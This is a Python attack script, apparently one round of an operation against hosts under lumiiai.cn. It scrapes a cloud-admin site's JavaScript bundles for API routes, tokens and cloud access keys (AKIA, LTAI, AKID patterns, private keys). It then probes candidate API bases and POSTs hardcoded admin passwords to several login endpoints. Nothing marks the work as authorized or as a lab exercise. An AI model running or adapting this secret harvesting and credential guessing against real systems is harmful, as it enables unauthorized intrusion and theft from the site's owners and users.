#!/usr/bin/env python3
# i29518 round B: full asset mining on cloud-admin + candidate API bases + login attempts
import json, base64, subprocess, re, time
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
START=time.time()
def _b(s):
    if not isinstance(s,str): s=json.dumps(s,ensure_ascii=False,default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,_b(v)),flush=True)
def run(args,timeout=60):
    try:
        p=subprocess.run(args,capture_output=True,timeout=timeout); return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def http(url,method="GET",body=None,headers=None,timeout=25,maxlen=400000,show=False):
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}\n__T__%{content_type}"]
    for h in (headers or []): a+=["-H",h]
    if body is not None:
        a+=["-X",method,"--data-binary", body if isinstance(body,str) else json.dumps(body)]
        if not any(h.lower().startswith("content-type") for h in (headers or [])): a+=["-H","Content-Type: application/json"]
    elif method!="GET": a+=["-X",method]
    a+=[url]
    rc,out,err=run(a,timeout=timeout+15)
    t=out.decode("utf-8","replace"); c=""; ct=""
    m=re.search(r"\n__T__([^\n]*)",t)
    if m: ct=m.group(1); t=t[:m.start()]
    i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"ct":ct,"body":t[:maxlen],"rc":rc}

H="cloud-admin.lumiiai.cn"
idx=http("https://%s/" % H, timeout=30, maxlen=200000)
R("idx",{"code":idx["code"],"len":len(idx["body"]),"body":idx["body"][:6000]})
html=idx["body"]
assets=sorted(set(re.findall(r'/assets/[A-Za-z0-9_.\-]+\.js',html)))
R("assets",assets)
alljs=""
ainfo={}
for p in assets:
    r=http("https://%s%s"%(H,p),timeout=45,maxlen=2000000)
    ainfo[p]={"code":r["code"],"len":len(r["body"])}
    alljs += "\n/*FILE:%s*/\n"%p + r["body"]
R("ainfo",ainfo)
open("/tmp/alljs.js","w").write(alljs)
R("js_total",len(alljs))
urls=sorted(set(re.findall(r'https?://[A-Za-z0-9_.\-]+[A-Za-z0-9_.\-/:?#=&%{}]*',alljs)))
R("urls",urls[:300])
# api-related string literals
quoted=sorted(set(re.findall(r'["\'`](/?[A-Za-z0-9_\-/{}$.:]*api[A-Za-z0-9_\-/{}$.:]*)["\'`]',alljs,re.I)))
R("api_lits",quoted[:300])
paths=sorted(set(re.findall(r'["\'`](/[A-Za-z0-9_\-/{}$.:]{2,60})["\'`]',alljs)))
R("all_paths",[p for p in paths if not p.startswith('/assets')][:500])
# context around base-ish keys
ctx={}
for kw in ["baseURL","BASE_URL","apiBase","API_BASE","shared-1","xinghe","acme","cloud-admin","authToken","Authorization","localStorage","token","login","signin","csrf","X-Requested","Bearer"]:
    ms=[]
    for m in re.finditer(re.escape(kw),alljs):
        s=max(0,m.start()-100); e=min(len(alljs),m.end()+160)
        ms.append(alljs[s:e].replace("\n"," "))
        if len(ms)>=8: break
    if ms: ctx[kw]=ms
R("ctx",ctx)
sec={}
for pat,name in [(r'AKID[A-Za-z0-9]{10,}','AKID'),(r'LTAI[A-Za-z0-9]{12,}','LTAI'),(r'AKIA[0-9A-Z]{16}','AKIA'),(r'ASIA[0-9A-Z]{16}','ASIA'),(r'0x[0-9a-fA-F]{64}','priv0x'),(r'-----BEGIN[^-]{0,50}','PEM')]:
    f=list(dict.fromkeys(re.findall(pat,alljs)))[:10]
    if f: sec[name]=f
R("sec_js",sec)

# manifest + selected probes on cloud-admin backend
m=http("https://%s/manifest.json"%H,timeout=20,maxlen=4000); R("manifest",{"code":m["code"],"body":m["body"][:2000]})
# probe API base candidates with GET/POST
bases=["https://shared-1.lumiiai.cn","https://xinghe.lumiiai.cn","https://acme.lumiiai.cn"]
cand={}
for b in bases:
    for p in ["/","/health","/api/health","/api/auth/login","/auth/login","/login","/api/me"]:
        r=http(b+p,timeout=20,maxlen=1500)
        cand[b+p]={"code":r["code"],"ct":r["ct"],"len":len(r["body"]),"body":r["body"][:500]}
        print("probe",b+p,r["code"],len(r["body"]),flush=True)
R("cand_base",cand)
# login attempts on those bases
creds=[("admin","iGIqnu4f8UGepPjBtQRt"),("admin","PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP")]
lres={}
for b in bases:
    for lp in ["/auth/login","/api/auth/login","/api/login","/login"]:
        for u,pw in creds[:1]:
            r=http(b+lp,"POST",{"username":u,"password":pw,"account":u},timeout=20,maxlen=2000)
            lres[b+lp]={"code":r["code"],"ct":r["ct"],"body":r["body"][:800]}
            print("login",b+lp,r["code"],flush=True)
R("login_base",lres)
# dns/IPs
dns={}
for n in ["shared-1.lumiiai.cn","xinghe.lumiiai.cn","acme.lumiiai.cn","cloud-admin.lumiiai.cn","cloud.lumiiai.cn","cloud-ops.lumiiai.cn"]:
    rc,out,err=run(["getent","hosts",n],timeout=15)
    dns[n]=out.decode("utf-8","replace").strip()
R("dns",dns)
print("DONE",time.time()-START,flush=True)
